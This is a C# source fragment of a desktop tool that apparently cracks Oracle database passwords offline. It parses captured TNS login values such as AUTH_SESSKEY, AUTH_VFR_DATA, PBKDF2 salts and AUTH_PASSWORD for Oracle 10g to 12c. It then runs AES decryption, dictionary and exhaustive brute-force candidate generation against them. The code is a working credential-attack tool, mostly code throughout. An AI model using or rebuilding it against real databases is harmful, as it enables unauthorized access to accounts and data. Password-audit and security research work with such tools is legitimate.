            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 192;
                    AES.BlockSize = 128;
                    AES.IV = new byte[16];
                    AES.Mode = CipherMode.CBC;
                    AES.Key = Key;                    

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        private byte[] AES_Encrypt_none_padding(byte[] bytesToBeEncrypted, byte[] Key)
        {
            byte[] encryptedBytes = null;

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 192;
                    AES.BlockSize = 128;
                    AES.IV = new byte[16];
                    AES.Mode = CipherMode.CBC;
                    AES.Padding = PaddingMode.None;
                    AES.Key = Key;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        private byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] Key)
        {
            byte[] decryptedBytes = null;

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 192;
                    AES.BlockSize = 128;
                    AES.Key = Key;
                    AES.IV = new byte[16];
                    AES.Mode = CipherMode.CBC;

                    var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write);

                    cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                    cs.Close();

                    decryptedBytes = ms.ToArray();
                }
            }

            return decryptedBytes;
        }

        private byte[] AES_Decrypt_none_padding(byte[] bytesToBeDecrypted, byte[] Key)
        {
            byte[] decryptedBytes = null;

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 192;
                    AES.BlockSize = 128;
                    AES.Key = Key;
                    AES.IV = new byte[16];
                    AES.Mode = CipherMode.CBC;
                    AES.Padding = PaddingMode.None;

                   var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write);
                    
                   cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                   cs.Close();
                    
                   decryptedBytes = ms.ToArray();
                }
            }

            return decryptedBytes;
        }

        private static byte[] HexStringToByteArray(string hex)
        {
            if (hex.Length % 2 == 1)
                throw new Exception("The binary key cannot have an odd number of digits");

            byte[] arr = new byte[hex.Length >> 1];

            for (int i = 0; i < hex.Length >> 1; ++i)
            {
                arr[i] = (byte)((GetHexVal(hex[i << 1]) << 4) + (GetHexVal(hex[(i << 1) + 1])));
            }

            return arr;
        }

        private static int GetHexVal(char hex)
        {
            int val = (int)hex;
            //For uppercase A-F letters:
            //return val - (val < 58 ? 48 : 55);
            //For lowercase a-f letters:
            //return val - (val < 58 ? 48 : 87);
            //Or the two combined, but a bit slower:
            return val - (val < 58 ? 48 : (val < 97 ? 55 : 87));
        }

        private static string ByteArrayToHexString(byte[] byteArray)
        {
            string HexString = BitConverter.ToString(byteArray);
            return HexString.Replace("-", "");
        }

        private static byte[] XOR(byte[] a, byte[] b)
        {
            byte[] res = new byte[a.Length];

            for (int i = 0; i < a.Length; i++)
                res[i] = (byte)(a[i] ^ b[i]);

            return res;
        }

        private static byte[]  oracle10gPrepare(string username, string pass)
        {            
            byte[] username_pass_b = Encoding.UTF8.GetBytes(username.ToUpper()+pass.ToUpper());
            int tmp, length = username_pass_b.Length<<1;
            if ((tmp = length % 8) != 0) length = length + 8 - tmp;
            
            byte[] result = new byte[length];

            length = username_pass_b.Length;
            for (int i = 0; i < length; i++)
                result[(i << 1) + 1] = username_pass_b[i];

                return result;
        }




        static IEnumerable<string> Fuck(byte[] alfabet, int length)
        {
            int Mindigit = 0, Maxdigit = alfabet.Length;

            if (length <= 0)
                throw new ArgumentException("Negative length", "length");
            if (length == 1)
            {
                for (int i = Mindigit; i < Maxdigit; i++)
                    yield return alfabet[i].ToString();
                yield break;
            }
            for (int i = Mindigit; i < Maxdigit; i++)
                foreach (string s in Fuck(alfabet, length - 1))
                    yield return alfabet[i].ToString() + s;
        }

        private bool loadParamFromFile(string Path)
        {
            try
            {
                StreamReader sreader = new StreamReader(Path);
                string line;
                int offset = -1;
                int foundedItem = 0;

                while ((line = sreader.ReadLine()) != null)
                    if ((offset = line.IndexOf("AUTH_SESSKEY")) > -1)                       
                        break;

                if (line.Length > offset + 17 + 96)
                {//Oracle 11g or 12c
                    //listBox1.SelectedIndex = 0;
                    do
                    {
                        if ((offset = line.IndexOf("AUTH_SESSKEY")) > -1)
                        {
                            textBox_AUTH_SESSKEY_clnt.Text = line.Substring(offset + 15, 64).Replace(" ", "");
                            foundedItem++;
                            string ds = char.ConvertFromUtf32(0x0003);
                            int offset_2 = line.LastIndexOf(char.ConvertFromUtf32(0x0003), offset) + 1;
                            textBox_USERNAME.Text = line.Substring(offset_2, offset - offset_2 - 5);
                            foundedItem++;
                            break;
                        }
                    } while ((line = sreader.ReadLine()) != null);

                    do
                    {
                        if ((offset = line.IndexOf("AUTH_VFR_DATA")) > -1)
                        {
                            textBox_AUTH_VFR_DATA.Text = line.Substring(offset + 18, 32);
                            foundedItem++;
                            break;
                        }
                    } while ((line = sreader.ReadLine()) != null);

                    do
                    {
                        if ((offset = line.IndexOf("AUTH_PBKDF2_CSK_SALT")) > -1)
                        {
                            textBox_PBKDF2Salt.Text = line.Substring(offset + 16, 32);
                            foundedItem++;
                            break;
                        }
                    }
                    while ((line = sreader.ReadLine()) != null);


                    textBox_AUTH_SESSKEY_srv.Text = line.Substring(offset + 17, 64);
                    foundedItem++;
                   

                    do
                    {
                        if ((offset = line.IndexOf("AUTH_SESSKEY")) > -1)
                        {
                            textBox_AUTH_SESSKEY_clnt.Text = line.Substring(offset + 18, 97).Replace(" ", "");
                            foundedItem++;
                            string ds = char.ConvertFromUtf32(0x0003);
                            int offset_2 = line.LastIndexOf(char.ConvertFromUtf32(0x0003), offset) + 1;
                            textBox_USERNAME.Text = line.Substring(offset_2, offset - offset_2 - 5);
                            foundedItem++;
                            break;
                        }
                    } while ((line = sreader.ReadLine()) != null);

                    do
                    {
                        if ((offset = line.IndexOf("AUTH_PASSWORD")) > -1)
                        {
                            textBox_AUTH_PASSWORD.Text = line.Substring(offset + 18, 64);
                            foundedItem++;
                            break;
                        }
                    } while ((line = sreader.ReadLine()) != null);
                   
                }
                else if(line.Length > offset + 15 + 64)
                {
                    textBox_AUTH_SESSKEY_srv.Text = line.Substring(offset + 15, 64);
                    foundedItem++;

                    do
                    {
                        if ((offset = line.IndexOf("AUTH_VFR_DATA")) > -1)
                        {
                            textBox_AUTH_VFR_DATA.Text = line.Substring(offset + 16, 32);
                            foundedItem++;
                            break;
                        }
                    } while ((line = sreader.ReadLine()) != null);

                    do
                    {
                        if ((offset = line.IndexOf("AUTH_PBKDF2_CSK_SALT")) > -1)
                        {
                            textBox_PBKDF2Salt.Text = line.Substring(offset + 23, 32);
                            foundedItem++;
                            break;
                        }
                    }
                    while ((line = sreader.ReadLine()) != null);

                    do
                    {
                        if ((offset = line.IndexOf("AUTH_PBKDF2_VGEN_COUNT")) > -1)
                        {
                            textBox_PBKDF2VgenCount.Text = line.Substring(offset + 25, 4);
                            foundedItem++;
                            break;
                        }
                    }
                    while ((line = sreader.ReadLine()) != null);

                    do
                    {
                        if ((offset = line.IndexOf("AUTH_PBKDF2_SDER_COUNT")) > -1)
                        {
                            textBox_PBKDF2SderCount.Text = line.Substring(offset + 25, 1);
                            foundedItem++;
                            break;
                        }
                    }
                    while ((line = sreader.ReadLine()) != null);

                    do
                    {
                        if ((offset = line.IndexOf("AUTH_PASSWORD")) > -1)
                        {
                            textBox_AUTH_PASSWORD.Text = line.Substring(offset + 16, 64);
                            foundedItem++;
                            break;
                        }
                    } while ((line = sreader.ReadLine()) != null);                                                                                                         

                    do
                    {
                        if ((offset = line.IndexOf("AUTH_PBKDF2_SPEEDY_KEY")) > -1)
                        {
                            textBox_AUTH_PBKDF2_SPEEDY_KEY.Text = line.Substring(offset + 25, 160);
                            foundedItem++;
                            break;
                        }
                    }
                    while ((line = sreader.ReadLine()) != null);

                    do
                    {
                        if ((offset = line.IndexOf("AUTH_SESSKEY")) > -1)
                        {
                            textBox_AUTH_SESSKEY_clnt.Text = line.Substring(offset + 15, 64).Replace(" ", "");
                            foundedItem++;
                            string ds = char.ConvertFromUtf32(0x0003);
                            int offset_2 = line.LastIndexOf(char.ConvertFromUtf32(0x0003), offset) + 1;
                            textBox_USERNAME.Text = line.Substring(offset_2, offset - offset_2 - 5);
                            foundedItem++;
                            break;
                        }
                    } while ((line = sreader.ReadLine()) != null);                    
                }
                else
                {//Oracle 10g
                    listBox1.SetSelected(0, true);

                    textBox_AUTH_SESSKEY_srv.Text = line.Substring(offset + 17, 96);
                    foundedItem++;

                    textBox_AUTH_VFR_DATA.Text = "Not used!";
                    foundedItem++;

                    while ((line = sreader.ReadLine()) != null)
                    {
                        if ((offset = line.IndexOf("AUTH_SESSKEY")) > -1)
                        {
                            textBox_AUTH_SESSKEY_clnt.Text = line.Substring(offset + 17, 64);
                            foundedItem++;
                            string ds = char.ConvertFromUtf32(0x0003);
                            int offset_2 = line.LastIndexOf(char.ConvertFromUtf32(0x0003), offset) + 1;
                            textBox_USERNAME.Text = line.Substring(offset_2, offset - offset_2 - 5);
                            foundedItem++;
                            break;
                        }
                    }

                    do
                    {
                        if ((offset = line.IndexOf("AUTH_PASSWORD")) > -1)
                        {
                            textBox_AUTH_PASSWORD.Text = line.Substring(offset + 18, 64);
                            foundedItem++;
                            break;
                        }
                    } while ((line = sreader.ReadLine()) != null);
                }

                if (foundedItem == 5 || foundedItem == 9)
                    return true;
                else return false;
            }
            catch (Exception e) 
            {
                return false;
            }
        }

        private bool DictionaryFileToDictionaryArray(string dict)
        {
            try
            {
                StreamReader fileResult = new StreamReader(dict);

                dictionary = fileResult.ReadToEnd().ToString().Split(new char[] {'\n', '\r'}, StringSplitOptions.RemoveEmptyEntries);
                
                //убирает пробелы в паролях, но очень наргужает производительность
                //foreach (var pass in dictionary)
                //{
                //    while (pass.Contains(" "))
                //        pass.Replace(" ", "");
                //}

                fileResult.Close();

                if (dictionary.Length == 0)
                    return false;
            }
            catch
            {
                return false;
            }
            return true;
        }
        
        private void Out(string res)
        {
            StreamWriter fileResult = new StreamWriter(pathResFile);

            fileResult.Write(res);

            fileResult.Close();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            System.Environment.Exit(1);
        }

        private void BruteProgress_Click(object sender, EventArgs e)
        {

        }
    }
}


